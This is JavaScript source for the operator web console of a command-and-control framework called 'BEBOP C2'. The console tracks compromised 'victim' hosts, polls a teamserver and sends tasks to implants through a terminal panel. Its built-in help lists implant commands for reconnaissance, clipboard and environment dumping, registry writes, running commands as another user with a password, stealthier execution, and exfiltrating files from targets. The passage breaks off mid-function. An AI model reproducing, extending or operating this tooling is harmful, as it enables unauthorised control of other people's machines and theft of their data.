// ---- Stars ----

function initStars() {
    const container = document.createElement('div');
    container.id = 'stars';
    document.documentElement.appendChild(container);
    for (let i = 0; i < 150; i++) {
        const star = document.createElement('div');
        star.className = 'star';
        star.style.left    = (Math.random() * 100).toFixed(2) + 'vw';
        star.style.top     = (Math.random() * 100).toFixed(2) + 'vh';
        star.style.opacity = (0.05 + Math.random() * 0.2).toFixed(2);
        const size = Math.random() < 0.85 ? 1 : 2;
        star.style.width  = size + 'px';
        star.style.height = size + 'px';
        container.appendChild(star);
    }
}

initStars();

// ---- Terminal Resizer ----

function initTerminalResizer() {
    const resizer = document.getElementById('terminal-resizer');
    const workspace = document.querySelector('.workspace');
    if (!resizer || !workspace) return;

    let isResizing = false;

    resizer.addEventListener('mousedown', (e) => {
        isResizing = true;
        workspace.classList.add('resizing');
        document.body.style.cursor = 'row-resize';
        e.preventDefault();
    });

    document.addEventListener('mousemove', (e) => {
        if (!isResizing) return;
        const workspaceRect = workspace.getBoundingClientRect();
        const newHeight = workspaceRect.bottom - e.clientY;
        
        // Clamp height between 100px and 80% of workspace
        const clampedHeight = Math.max(100, Math.min(newHeight, workspaceRect.height * 0.8));
        document.documentElement.style.setProperty('--terminal-height', clampedHeight + 'px');

        if (_currentView === 'map') loadSessions();
    });

    document.addEventListener('mouseup', () => {
        if (isResizing) {
            isResizing = false;
            workspace.classList.remove('resizing');
            document.body.style.cursor = '';
            const h = getComputedStyle(document.documentElement).getPropertyValue('--terminal-height');
            localStorage.setItem('bebop_termHeight', h.trim());
        }
    });
}

function initPanelResizerH() {
    const resizer = document.getElementById('panel-resizer-h');
    const container = document.querySelector('.bottom-panels');
    const termPanel = document.querySelector('.terminal-panel');
    const logPanel = document.querySelector('.event-log-panel');
    if (!resizer || !container || !termPanel || !logPanel) return;

    let isResizing = false;

    resizer.addEventListener('mousedown', (e) => {
        isResizing = true;
        container.classList.add('resizing-h');
        document.body.style.cursor = 'col-resize';
        e.preventDefault();
    });

    document.addEventListener('mousemove', (e) => {
        if (!isResizing) return;
        const rect = container.getBoundingClientRect();
        const offset = e.clientX - rect.left;
        const minW = 200;
        const clamped = Math.max(minW, Math.min(offset, rect.width - minW));
        const ratio = clamped / rect.width;
        termPanel.style.flex = 'none';
        logPanel.style.flex = 'none';
        termPanel.style.width = (ratio * 100) + '%';
        logPanel.style.width = ((1 - ratio) * 100) + '%';
        if (_term) _fitAddon.fit();
    });

    document.addEventListener('mouseup', () => {
        if (isResizing) {
            isResizing = false;
            container.classList.remove('resizing-h');
            document.body.style.cursor = '';
            if (_term) _fitAddon.fit();
        }
    });
}

// Call inits
setTimeout(() => {
    initTerminalResizer();
    initPanelResizerH();
    initMapControls();
}, 100);

// ---- Navigation ----

let _currentView = 'table';

function setView(view) {
    _currentView = view;
    const grid = document.getElementById('sessions-grid');
    const tableView = document.getElementById('sessions-table-view');
    const mapView = document.getElementById('map-view');
    
    const btnGrid = document.getElementById('btn-view-grid');
    const btnTable = document.getElementById('btn-view-table');
    const btnMap = document.getElementById('btn-view-map');

    // Hide all
    if (grid) grid.style.display = 'none';
    if (tableView) tableView.style.display = 'none';
    if (mapView) mapView.style.display = 'none';
    
    // Deactivate all buttons
    [btnGrid, btnTable, btnMap].forEach(btn => { if (btn) btn.classList.remove('active'); });

    if (view === 'grid') {
        if (grid) grid.style.display = 'grid';
        if (btnGrid) btnGrid.classList.add('active');
    } else if (view === 'table') {
        if (tableView) tableView.style.display = 'block';
        if (btnTable) btnTable.classList.add('active');
        loadSessions();
    } else {
        if (mapView) mapView.style.display = 'flex';
        if (btnMap) btnMap.classList.add('active');
        const noMsg = document.getElementById('no-sessions');
        if (noMsg) noMsg.style.display = 'none';
        loadSessions();
    }
}

// ---- Table Rendering ----

function renderTable(beacons) {
    const tbody = document.getElementById('beacons-table-body');
    if (!tbody) return;

    tbody.innerHTML = '';
    beacons.slice().sort((a, b) => a.id - b.id).forEach(b => {
        const status = beaconStatus(b);
        const os = (PLATFORM_MAP[b.platform] ?? String(b.platform)) + ' ' + (ARCH_MAP[b.arch] ?? String(b.arch));
        const integ = INTEGRITY_MAP[b.integrity] ?? String(b.integrity);
        const tr = document.createElement('tr');
        
        tr.innerHTML = `
            <td>
                <div class="status-cell beacon-${status}">
                    <span class="card-badge badge-${status}">${status.toUpperCase()}</span>
                </div>
            </td>
            <td style="color: var(--amber)">${escapeHtml(b.hostname || '?')}</td>
            <td>${escapeHtml(b.username || '—')}</td>
            <td>${escapeHtml(os)}</td>
            <td>${escapeHtml(integ)}</td>
            <td>${b.process_id}</td>
            <td style="color: var(--blue)">${escapeHtml(b.listener_name || '—')}</td>
            <td>${b.sleep}s</td>
            <td data-ts="${b.last_seen}">${timeAgo(b.last_seen)}</td>
            <td>
                <div style="display: flex; gap: 8px;">
                    <button class="btn-interact" onclick="openTerminal(${b.id})">INTERACT</button>
                    <button class="${b.alive ? 'btn-kill' : 'btn-delete'}" onclick="showKillModal(${b.id}, '${escapeHtml(b.hostname || '')}', ${!b.alive})">${b.alive ? 'KILL' : 'DELETE'}</button>
                </div>
            </td>
        `;
        tbody.appendChild(tr);
    });
}

// ---- Context Menu ----

let _activeCtxBeacon = null;

function hideContextMenu() {
    const menu = document.getElementById('context-menu');
    if (menu) menu.style.display = 'none';
}

function showContextMenu(e, beacon) {
    e.preventDefault();
    _activeCtxBeacon = beacon;
    const menu = document.getElementById('context-menu');
    if (!menu) return;

    menu.style.display = 'block';
    menu.style.left = e.clientX + 'px';
    menu.style.top = e.clientY + 'px';

    document.getElementById('ctx-interact').onclick = () => {
        openTerminal(beacon.id);
        hideContextMenu();
    };
    document.getElementById('ctx-kill').onclick = () => {
        showKillModal(beacon.id, beacon.hostname, !beacon.alive);
        hideContextMenu();
    };
}

document.addEventListener('click', hideContextMenu);
document.addEventListener('contextmenu', (e) => {
    if (!e.target.closest('.node-victim')) hideContextMenu();
});

// ---- Graph Rendering ----

let _manualPositions = {};
let _draggingNode = null;
let _dragOffset = { x: 0, y: 0 };
let _hasDragged = false;
let _mapZoom = 1.0;
let _mapPan = { x: 0, y: 0 };
let _isPanning = false;
let _panStart = { x: 0, y: 0 };

function initMapControls() {
    const container = document.getElementById('map-container');
    const viewport = document.getElementById('map-viewport');
    if (!container || !viewport) return;

    // Zoom
    container.addEventListener('wheel', (e) => {
        if (_currentView !== 'map') return;
        e.preventDefault();
        const zoomSpeed = 0.1;
        if (e.deltaY < 0) _mapZoom = Math.min(3.0, _mapZoom + zoomSpeed);
        else _mapZoom = Math.max(0.2, _mapZoom - zoomSpeed);
        updateMapTransform();
    }, { passive: false });

    // Pan Start
    container.addEventListener('mousedown', (e) => {
        if (_currentView !== 'map' || e.button !== 0) return;
        if (e.target.closest('.map-node')) return; // Don't pan if dragging a node

        _isPanning = true;
        _panStart.x = e.clientX - _mapPan.x * _mapZoom;
        _panStart.y = e.clientY - _mapPan.y * _mapZoom;
        container.style.cursor = 'grabbing';
        viewport.style.transition = 'none';
    });

    // Pan Move & Node Drag Move
    document.addEventListener('mousemove', (e) => {
        if (_isPanning) {
            _mapPan.x = (e.clientX - _panStart.x) / _mapZoom;
            _mapPan.y = (e.clientY - _panStart.y) / _mapZoom;
            updateMapTransform();
            return;
        }

        if (!_draggingNode) return;
        _hasDragged = true;
        const nodeContainer = document.getElementById('map-nodes');
        const rect = nodeContainer.getBoundingClientRect();
        
        // Correct mouse coordinates considering zoom AND pan
        let x = (e.clientX - rect.left) / _mapZoom + 50 - (_dragOffset.x / _mapZoom);
        let y = (e.clientY - rect.top) / _mapZoom + 50 - (_dragOffset.y / _mapZoom);

        _draggingNode.el.style.left = (x - 50) + 'px';
        _draggingNode.el.style.top = (y - 50) + 'px';
        _manualPositions[_draggingNode.id] = { x, y };

        const sPos = _manualPositions['server'];
        const svg = document.getElementById('map-svg');
        if (_draggingNode.id === 'server') {
            svg.querySelectorAll('line').forEach(l => {
                l.setAttribute('x1', x); l.setAttribute('y1', y);
            });
        } else {
            const line = document.getElementById('line-' + _draggingNode.id);
            if (line) {
                line.setAttribute('x2', x);
                line.setAttribute('y2', y);
            }
        }
    });

    document.addEventListener('mouseup', () => {
        if (_isPanning) {
            _isPanning = false;
            container.style.cursor = '';
            viewport.style.transition = 'transform 0.1s ease-out';
        }
        if (_draggingNode) {
            _draggingNode.el.style.transition = '';
            _draggingNode.el.style.zIndex = '';
            _draggingNode = null;
        }
    });
}

function updateMapTransform() {
    const viewport = document.getElementById('map-viewport');
    if (viewport) {
        viewport.style.transform = `scale(${_mapZoom}) translate(${_mapPan.x}px, ${_mapPan.y}px)`;
    }
}

// Call controls init
setTimeout(initMapControls, 100);

function renderMap(beacons) {
    const container = document.getElementById('map-nodes');
    const svg = document.getElementById('map-svg');
    const viewport = document.getElementById('map-viewport');
    if (!container || !svg || !viewport) return;

    // Apply current transform
    updateMapTransform();

    // Don't wipe if we are interacting
    if (_draggingNode || _isPanning) return;

    container.innerHTML = '';
    svg.innerHTML = '';

    const width = svg.clientWidth;
    const height = svg.clientHeight;
    const centerX = width / 2;
    const centerY = height / 2;
    const offset = 50;

    // 1. Teamserver (Center)
    if (!_manualPositions['server']) {
        _manualPositions['server'] = { x: centerX, y: centerY };
    }
    const sPos = _manualPositions['server'];
    
    const serverNode = document.createElement('div');
    serverNode.className = 'map-node node-server';
    serverNode.style.left = (sPos.x - offset) + 'px';
    serverNode.style.top = (sPos.y - offset) + 'px';
    serverNode.innerHTML = '<div class="node-icon"></div><div class="node-label">Teamserver</div>';
    initDraggable(serverNode, 'server');
    container.appendChild(serverNode);

    if (!beacons || beacons.length === 0) return;

    // 2. Beacons
    const radius = Math.min(centerX, centerY) * 0.65;
    beacons.forEach((b, i) => {
        const id = 'beacon-' + b.id;
        if (!_manualPositions[id]) {
            const angle = (i / beacons.length) * (2 * Math.PI);
            _manualPositions[id] = {
                x: centerX + radius * Math.cos(angle),
                y: centerY + radius * Math.sin(angle)
            };
        }
        
        const pos = _manualPositions[id];
        const node = document.createElement('div');
        node.className = 'map-node node-victim' + (!b.alive ? ' dead' : '');
        node.style.left = (pos.x - offset) + 'px';
        node.style.top = (pos.y - offset) + 'px';
        node.innerHTML = `<div class="node-icon"></div><div class="node-label">${escapeHtml(b.hostname || 'Unknown')}</div>`;
        
        // Single click to interact (if not dragged)
        node.onclick = () => {
            if (!_hasDragged) openTerminal(b.id);
        };

        // Right click for context menu
        node.oncontextmenu = (e) => showContextMenu(e, b);
        
        initDraggable(node, id);
        container.appendChild(node);

        // Draw connection line
        const line = document.createElementNS('http://www.w3.org/2000/svg', 'line');
        line.id = 'line-' + id;
        line.setAttribute('x1', sPos.x);
        line.setAttribute('y1', sPos.y);
        line.setAttribute('x2', pos.x);
        line.setAttribute('y2', pos.y);
        line.setAttribute('class', 'connection-line');
        svg.appendChild(line);
    });
}

function initDraggable(el, id) {
    el.onmousedown = (e) => {
        if (e.button !== 0) return; // Left click only
        _draggingNode = { el, id };
        _hasDragged = false;
        const rect = el.getBoundingClientRect();
        _dragOffset.x = e.clientX - rect.left;
        _dragOffset.y = e.clientY - rect.top;
        el.style.transition = 'none';
        el.style.zIndex = 1000;
        e.preventDefault();
    };
}

// ---- Teamserver config ----

function getTsUrl() {
    const ip   = localStorage.getItem('tsIp')   || '';
    const port = localStorage.getItem('tsPort')  || '8080';
    if (!ip) return '';
    return 'http://' + ip + ':' + port;
}

function saveSettings() {
    const ipEl = document.getElementById('tsIp');
    const portEl = document.getElementById('tsPort');
    if (!ipEl || !portEl) return;

    const ip   = ipEl.value.trim();
    const port = portEl.value.trim() || '8080';
    
    localStorage.setItem('tsIp',   ip);
    localStorage.setItem('tsPort', port);

    updateConnIndicator(!!ip);
    
    // Refresh current view
    if (document.getElementById('sessions-grid')) loadSessions();
    if (document.getElementById('listeners-tbody')) loadListeners();
    if (document.getElementById('build-btn')) populateBuildListeners();
}

function initSettings() {
    const ipEl   = document.getElementById('tsIp');
    const portEl = document.getElementById('tsPort');
    if (ipEl)   ipEl.value   = localStorage.getItem('tsIp')   || '';
    if (portEl) portEl.value = localStorage.getItem('tsPort')  || '';
    updateConnIndicator(!!(localStorage.getItem('tsIp') || ''));
}

function updateConnIndicator(connected) {
    const dot    = document.getElementById('conn-dot');
    const status = document.getElementById('conn-status');
    if (dot)    dot.className    = 'conn-dot' + (connected ? ' connected' : '');
    if (status) status.textContent = connected ? 'CONNECTED' : 'OFFLINE';
}

// ---- Client-side help ----

const HELP_TEXT = [
    '',
    '[ 01. IDENTITY & RECON ]',
    '  whoami              Query current session user context',
    '  hostname            Display target machine network name',
    '  domain              Retrieve DNS domain / AD membership status',
    '  getpid              Show process ID of the running implant',
    '  getintegrity        Check token integrity (Low/Med/High/System)',
    '',
    '[ 02. SYSTEM ENUMERATION ]',
    '  sysinfo             Retrieve OS build, arch, and memory metrics',
    '  drives              List logical drives and available storage',
    '  env                 Dump all process environment variables',
    '  getenv <var>        Get value of a specific environment variable',
    '',
    '[ 03. FILESYSTEM MANIPULATION ]',
    '  pwd                 Print current working directory',
    '  cd <path>           Change working directory',
    '  ls [path]           List directory contents (Alias: dir)',
    '  cat <file>          Read and display raw file content',
    '  stat <path>         Get file/directory metadata and timestamps',
    '  mkdir <path>        Create a new directory',
    '  rm <file>           Permanently delete a file',
    '  rmdir <path>        Remove an empty directory',
    '  cp <src> <dst>      Copy file to a new destination',
    '  mv <src> <dst>      Move or rename file/directory',
    '',
    '[ 04. PROCESS & NETWORK ]',
    '  ps                  List active processes (PID, PPID, Name)',
    '  kill <pid>          Terminate a process by its ID',
    '  ipconfig            List network adapters and IP addresses',
    '  arp                 Display current ARP cache entries',
    '  netstat             List active TCP/UDP connections and listening ports',
    '  dns <name>          Resolve hostname to IP via DnsQuery (no nslookup)',
    '',
    '[ 05. PRIVILEGES & GROUPS ]',
    '  privs               List token privileges (SeDebug, SeImpersonate, etc.)',
    '  groups              List local groups the current user belongs to',
    '',
    '[ 06. PERSISTENCE & CONFIGURATION ]',
    '  services            Enumerate all Win32 services (name, state, PID)',
    '  uptime              Time since last system boot (GetTickCount64)',
    '  reg_query <H\\key> <val>   Read a registry value (HKLM/HKCU/HKCR/HKU)',
    '  reg_set   <H\\key> <val> <data>  Write a REG_SZ registry value',
    '',
    '[ 07. DATA COLLECTION ]',
    '  clipboard           Read current clipboard text content',
    '',
    '[ 08. BEACON CONTROL ]',
    '  sleep <sec> [jit]   Adjust check-in interval and jitter %',
    '  exit                Terminate the beacon session',
    '',
    '[ 09. EXECUTION MODES ]',
    '  runas <user> <pass> <cmd>  Run command as another user (no runas.exe)',
    '  shell <cmd>         Execute via cmd.exe /c (Supports pipes/built-ins)',
    '  <program> [args]    Direct execution (No cmd.exe - Stealthier)',
    '',
    '[ 10. TERMINAL ]',
    '  help                Show this command reference',
    '  clear               Clear the terminal screen',
    '',
    '[ 11. FILE TRANSFER ]',
    '  download <remote>    Exfil file from target to teamserver (beacon→op)',
    '  upload <remote>     Upload file from operator to target path (op→beacon)',
    '                      Opens a file picker, then stages the selected file to <remote>',
    '',
    '───────────────────────────────────────────────────────────────',
    'All commands are executed natively via Win32 API unless "shell" is used.',
];

// ---- Utilities ----

const VALID_COMMANDS = [
    'whoami', 'hostname', 'domain', 'getpid', 'getintegrity',
    'sysinfo', 'drives', 'env', 'getenv', 'pwd', 'cd', 'ls', 'dir',
    'cat', 'stat', 'mkdir', 'rm', 'rmdir', 'cp', 'mv', 'ps', 'kill',
    'ipconfig', 'arp', 'netstat', 'dns',
    'privs', 'groups', 'services', 'uptime',
    'reg_query', 'reg_set', 'clipboard', 'runas',
    'shell', 'sleep', 'exit', 'help', 'clear',
    'download', 'upload',
];

const ARCH_MAP      = ['x86', 'x64', 'arm', 'arm64'];
const PLATFORM_MAP  = ['Linux', 'macOS', 'Windows'];
const INTEGRITY_MAP = ['Untrusted', 'Low', 'Medium', 'High', 'System'];

function timeAgo(unixTs) {
    const diff = Math.floor(Date.now() / 1000) - unixTs;
    if (diff < 60)   return diff + 's ago';
    if (diff < 3600) return Math.floor(diff / 60) + 'm ago';
    return Math.floor(diff / 3600) + 'h ago';
}

setInterval(() => {
    document.querySelectorAll('[data-ts]').forEach(el => {
        el.textContent = timeAgo(+el.dataset.ts);
    });
}, 1000);

function escapeHtml(s) {
    return String(s)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');
}

// ---- Kill beacon ----

let _killTargetId = null;

let _killIsDead = false;

function showKillModal(id, hostname, isDead) {
    _killTargetId = id;
    _killIsDead = !!isDead;
    const el = document.getElementById('kill-modal-target');
    if (el) el.textContent = hostname || ('beacon #' + id);
    const label = document.getElementById('kill-modal-label');
    if (label) label.textContent = isDead ? 'Delete' : 'Kill';
    const btn = document.getElementById('kill-modal-confirm');
    if (btn) {
        btn.textContent = isDead ? 'DELETE' : 'KILL';
        btn.className = isDead ? 'btn-delete' : 'btn-kill';
    }
    const modal = document.getElementById('kill-modal');
    if (modal) modal.style.display = 'flex';
}

function cancelKill() {
    _killTargetId = null;
    const modal = document.getElementById('kill-modal');
    if (modal) modal.style.display = 'none';
}

async function confirmKill() {
    const id = _killTargetId;
    const target = document.getElementById('kill-modal-target');
    const hostname = target ? target.textContent : '#' + id;
    cancelKill();
    if (id == null) return;
    const tsUrl = getTsUrl();
    if (!tsUrl) return;
    try {
        await fetch(tsUrl + '/api/sessions/' + id, { method: 'DELETE' });
    } catch (e) {
        console.error('kill beacon:', e);
    }
    loadSessions();
}

// ---- Toast ----

function showToast(hostname, username) {
    const container = document.getElementById('toast-container');
    if (!container) return;
    const toast = document.createElement('div');
    toast.className = 'toast';
    toast.innerHTML =
        '<div class="toast-dot"></div>' +
        '<div>' +
            '<div class="toast-title">NEW SESSION</div>' +
            '<div class="toast-body">' + escapeHtml(hostname) + ' // ' + escapeHtml(username) + '</div>' +
            '<div class="toast-quote">"A new soul has drifted in."</div>' +
        '</div>';
    container.appendChild(toast);
    requestAnimationFrame(() => {
        requestAnimationFrame(() => toast.classList.add('toast-visible'));
    });
    setTimeout(() => {
        toast.classList.remove('toast-visible');
        toast.classList.add('toast-hiding');
        setTimeout(() => { if (toast.parentNode) toast.parentNode.removeChild(toast); }, 400);
    }, 4000);
}

// ---- Sessions page ----

let _knownBeaconIds    = null;
let _knownBeaconAlive  = {};
let _sessionsInterval  = null;
let _eventLogInterval  = null;
let _lootInterval      = null;
let _listenersInterval = null;

function beaconStatus(b) {
    if (!b.alive) return 'dead';
    return 'active';
}

async function loadSessions() {
    const tsUrl = getTsUrl();
    const grid  = document.getElementById('sessions-grid');
    const noMsg = document.getElementById('no-sessions');

    if (!tsUrl) {
        if (grid)  grid.innerHTML = '';
        if (noMsg) {
            noMsg.innerHTML = 'Enter teamserver IP and port above and click Connect.' +
                '<span class="empty-quote">"See you, space cowboy..."</span>';
            noMsg.style.display = '';
        }
        updateConnIndicator(false);
        return;
    }

    try {
        const resp    = await fetch(tsUrl + '/api/sessions');
        if (!resp.ok) throw new Error('HTTP ' + resp.status);
        const beacons = await resp.json();

        updateConnIndicator(true);

        const aliveBeacons = beacons.filter(b => b.alive).length;
        const titleEl = document.getElementById('sessions-title');
        if (titleEl) {
            titleEl.innerHTML = `Sessions <span class="count-minimal">// ${aliveBeacons} active</span>`;
        }

        if (_currentView === 'map') {
            renderMap(beacons);
        } else if (_currentView === 'table') {
            renderTable(beacons);
        }

        if (!grid) return;

        if (beacons.length === 0) {
            grid.innerHTML = '';
            if (noMsg && _currentView !== 'map') {
                noMsg.innerHTML = 'No active beacons.' +
                    '<span class="empty-quote">"You\'re gonna carry that weight."</span>';
                noMsg.style.display = '';
            } else if (noMsg) {
                noMsg.style.display = 'none';
            }
            if (_knownBeaconIds === null) _knownBeaconIds = new Set();
            return;
        }
        if (noMsg) noMsg.style.display = 'none';

        // Toast + event log for new beacons
        if (_knownBeaconIds === null) {
            _knownBeaconIds = new Set();
            _knownBeaconAlive = {};
            for (const b of beacons) {
                _knownBeaconIds.add(b.id);
                _knownBeaconAlive[b.id] = b.alive;
            }
        } else {
            for (const b of beacons) {
                if (!_knownBeaconIds.has(b.id)) {
                    _knownBeaconIds.add(b.id);
                    _knownBeaconAlive[b.id] = b.alive;
                    showToast(b.hostname || '?', b.username || '?');
                }
                _knownBeaconAlive[b.id] = b.alive;
            }
        }

        // Diff update: animate only new cards, update existing in-place
        const rendered = new Set(
            [...grid.querySelectorAll('.beacon-card')].map(el => el.dataset.id)
        );
        const incoming = new Set(beacons.map(b => String(b.id)));

        // Remove stale cards
        grid.querySelectorAll('.beacon-card').forEach(el => {
            if (!incoming.has(el.dataset.id)) el.remove();
        });

        beacons.forEach((b, i) => {
            const status = beaconStatus(b);
            const os     = (PLATFORM_MAP[b.platform] ?? String(b.platform)) +
                           ' ' + (ARCH_MAP[b.arch] ?? String(b.arch));
            const integ  = INTEGRITY_MAP[b.integrity] ?? String(b.integrity);
            const sleep  = b.sleep + 's' + (b.jitter_pct != null ? ' / ' + b.jitter_pct + '% jitter' : '');
            const sid    = String(b.id);

            let card = grid.querySelector('.beacon-card[data-id="' + sid + '"]');
            if (card) {
                // Update mutable fields only — no re-animation
                card.className = 'beacon-card beacon-' + status;
                card.querySelector('.card-badge').className   = 'card-badge badge-' + status;
                card.querySelector('.card-badge').textContent = status.toUpperCase();
                const vals = card.querySelectorAll('.meta-value');
                if (vals[0]) vals[0].textContent = b.username || '—';
                if (vals[1]) vals[1].textContent = os;
                if (vals[2]) vals[2].textContent = integ;
                if (vals[3]) vals[3].textContent = b.process_id;
                if (vals[4]) vals[4].textContent = b.listener_name || '—';
                if (vals[5]) vals[5].textContent = sleep;
                if (vals[6]) { vals[6].dataset.ts = b.last_seen; vals[6].textContent = timeAgo(b.last_seen); }
                let dq = card.querySelector('.card-dead-quote');
                if (!b.alive && !dq) {
                    dq = document.createElement('div');
                    dq.className = 'card-dead-quote';
                    dq.innerHTML = '<em>"Whatever happens, happens."</em>';
                    card.querySelector('.card-actions').before(dq);
                } else if (b.alive && dq) {
                    dq.remove();
                }
            } else {
                // New card — animate
                card = document.createElement('div');
                card.className    = 'beacon-card beacon-' + status;
                card.dataset.id   = sid;
                card.style.animationDelay = (i * 0.06) + 's';
                card.innerHTML =
                    '<div class="card-header">' +
                        '<div class="card-hostname">' +
                            '<span class="status-dot"></span>' +
                            escapeHtml(b.hostname || '?') +
                        '</div>' +
                        '<span class="card-badge badge-' + status + '">' + status.toUpperCase() + '</span>' +
                    '</div>' +
                    '<div class="card-meta">' +
                        '<span class="meta-label">USER</span><span class="meta-value">'  + escapeHtml(b.username || '—') + '</span>' +
                        '<span class="meta-label">OS</span><span class="meta-value">'    + escapeHtml(os) + '</span>' +
                        '<span class="meta-label">INTEG</span><span class="meta-value">' + escapeHtml(integ) + '</span>' +
                        '<span class="meta-label">PID</span><span class="meta-value">'   + b.process_id + '</span>' +
                        '<span class="meta-label">LISTENER</span><span class="meta-value" style="color: var(--blue)">' + escapeHtml(b.listener_name || '—') + '</span>' +
                        '<span class="meta-label">SLEEP</span><span class="meta-value">' + escapeHtml(sleep) + '</span>' +
                        '<span class="meta-label">SEEN</span><span class="meta-value" data-ts="' + b.last_seen + '">'  + timeAgo(b.last_seen) + '</span>' +
                    '</div>' +
                    (!b.alive ? '<div class="card-dead-quote"><em>"Whatever happens, happens."</em></div>' : '') +
                    '<div class="card-actions">' +
                        '<a href="/interact/' + b.id + '" class="btn-interact" ' +
                           'onclick="openTerminal(' + b.id + '); return false;">INTERACT</a>' +
                        '<button class="' + (b.alive ? 'btn-kill' : 'btn-delete') + '" onclick="showKillModal(' + b.id + ', \'' + escapeHtml(b.hostname || '') + '\', ' + !b.alive + ')">' + (b.alive ? 'KILL' : 'DELETE') + '</button>' +
                    '</div>';
                grid.appendChild(card);
            }
        });

    } catch (e) {
        if (noMsg) {
            noMsg.innerHTML = 'Cannot reach teamserver &mdash; ' + escapeHtml(e.message) +
                '<span class="empty-quote">"The music\'s over. Try again."</span>';
            noMsg.style.display = '';
        }
        if (grid) grid.innerHTML = '';
        updateConnIndicator(false);
        console.error('loadSessions:', e);
    }
}

// ---- Terminal / Interact (Xterm.js) ----

let cmdHistory   = [];
let historyIdx   = -1;
let pollSince        = 0;
let beaconId         = null;
let pollInterval     = null;
let _pendingTasks    = 0;
let _lastSeenPrev    = 0;

// Xterm state
let _term          = null;
let _fitAddon      = null;
let _inputBuf      = '';
let _cursorPos     = 0;
let _promptVisible = false;

// Per-beacon terminal history persistence (survives page navigation)
const _beaconStates = {};
let _outputLog = [];

async function _saveTerminalToServer(id) {
    if (id == null) return;
    const tsUrl = getTsUrl();
    if (!tsUrl) return;
    const state = _beaconStates[id];
    if (!state) return;
    try {
        await fetch(tsUrl + '/api/terminal/' + id, {
            method: 'PUT',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                output_log: state.outputLog,
                cmd_history: state.cmdHistory,
                poll_since: state.pollSince,
            }),
        });
    } catch (_) {}
}

async function _loadTerminalFromServer(id) {
    const tsUrl = getTsUrl();
    if (!tsUrl) return null;
    try {
        const resp = await fetch(tsUrl + '/api/terminal/' + id);
        if (!resp.ok) return null;
        const state = await resp.json();
        if (!state || !state.output_log) return null;
        return {
            outputLog: state.output_log,
            cmdHistory: state.cmd_history || [],
            pollSince: state.poll_since || 0,
        };
    } catch (_) {
        return null;
    }
}

function _saveTabs() {
    try {
        const tabs = [];
        for (const [id, tab] of _openTabs) tabs.push({ id, hostname: tab.hostname });
        localStorage.setItem('bebop_tabs', JSON.stringify(tabs));
        localStorage.setItem('bebop_active', beaconId != null ? String(beaconId) : '');
        localStorage.setItem('bebop_panelOpen', document.body.classList.contains('panel-open') ? '1' : '0');
    } catch (_) {}
}

function _loadTabs() {
    try {
        const tabsRaw = localStorage.getItem('bebop_tabs');
        const activeRaw = localStorage.getItem('bebop_active');
        if (tabsRaw) {
            const tabs = JSON.parse(tabsRaw);
            for (const t of tabs) _openTabs.set(t.id, { hostname: t.hostname });
        }
        if (_openTabs.size > 0) {
            if (activeRaw) {
                const activeId = parseInt(activeRaw, 10);
                if (!isNaN(activeId) && _openTabs.has(activeId)) return activeId;
            }
            return _openTabs.keys().next().value;
        }
    } catch (_) {}
    return null;
}

let _serverSaveDirty = false;

setInterval(async () => {
    if (!_serverSaveDirty || beaconId == null) return;
    _beaconStates[beaconId] = {
        outputLog: _outputLog.slice(),
        cmdHistory: cmdHistory.slice(),
        pollSince: pollSince,
    };
    _saveTerminalToServer(beaconId);
    _serverSaveDirty = false;
}, 2000);

function _saveBeaconState(id) {
    if (id == null || !_term) return;
    _beaconStates[id] = {
        outputLog:  _outputLog.slice(),
        cmdHistory: cmdHistory.slice(),
        pollSince:  pollSince,
    };
    _saveTerminalToServer(id);
    _saveTabs();
}

function _restoreBeaconState(id) {
    const state = _beaconStates[id];
    if (!state) return false;
    cmdHistory = state.cmdHistory.slice();
    pollSince  = state.pollSince;
    _outputLog = state.outputLog.slice();
    _promptVisible = false;
    _inputBuf = '';
    _cursorPos = 0;
    for (const entry of _outputLog) {
        _replayLine(entry.text, entry.cls);
    }
    return true;
}

function _replayLine(text, cls) {
    if (!_term) return;
    if (cls === 'cmd-echo') {
        _term.writeln(text + ANSI.reset);
        return;
    }
    const normalized = String(text).replace(/\r\n/g, '\n').replace(/\r/g, '\n').trimEnd();
    if (!normalized.trim()) return;
    let color;
    switch (cls) {
        case 'err':  color = ANSI.red;              break;
        case 'hint': color = ANSI.dim + ANSI.amber; break;
        default:     color = ANSI.cream;             break;
    }
    const lines = normalized.split('\n');
    for (const line of lines) _term.writeln(color + line + ANSI.reset);
}

// ---- Event Log (server-persisted) ----

let _eventLog = [];

function _formatTs(date) {
    return String(date.getHours()).padStart(2, '0') + ':' +
           String(date.getMinutes()).padStart(2, '0') + ':' +
           String(date.getSeconds()).padStart(2, '0');
}

function _renderEventEntry(ts, msg) {
    const body = document.getElementById('event-log-body');
    if (!body) return;
    const emptyEl = body.querySelector('.event-log-empty');
    if (emptyEl) emptyEl.remove();
    const entry = document.createElement('div');
    entry.className = 'event-log-entry';
    const tsSpan = document.createElement('span');
    tsSpan.className = 'event-log-ts';
    tsSpan.textContent = ts;
    const msgSpan = document.createElement('span');
    msgSpan.className = 'event-log-msg';
    msgSpan.textContent = msg;
    entry.appendChild(tsSpan);
    entry.appendChild(msgSpan);
    body.appendChild(entry);
    body.scrollTop = body.scrollHeight;
}

async function loadEventLog() {
    const tsUrl = getTsUrl();
    if (!tsUrl) return;
    try {
        const resp = await fetch(tsUrl + '/api/events');
        if (!resp.ok) return;
        const events = await resp.json();
        if (!events) return;

        const knownCount = _eventLog.length;
        if (events.length <= knownCount) return;

        if (knownCount === 0) {
            const body = document.getElementById('event-log-body');
            if (body) body.innerHTML = '';
        }

        for (let i = knownCount; i < events.length; i++) {
            const ev = events[i];
            const d = new Date(ev.timestamp);
            const ts = _formatTs(d);
            _eventLog.push({ ts, type: ev.type, msg: ev.message });
            _renderEventEntry(ts, ev.message);
        }
    } catch (_) {}
}

function exportEventLog(e) {
    if (e) e.stopPropagation();
    if (_eventLog.length === 0) return;

    const date = new Date();
    const dateStr = date.toISOString().slice(0, 10);
    const lines = [
        '# BEBOP C2 — Event Log Export',
        '# Date: ' + date.toISOString(),
        '# Events: ' + _eventLog.length,
        '#' + '-'.repeat(60),
        '',
    ];

    const stripHtml = (s) => s.replace(/<[^>]*>/g, '');

    for (const ev of _eventLog) {
        lines.push('[' + ev.ts + '] ' + stripHtml(ev.msg));
    }

    lines.push('', '# END OF LOG');

    const blob = new Blob([lines.join('\n')], { type: 'text/plain' });
    const url  = URL.createObjectURL(blob);
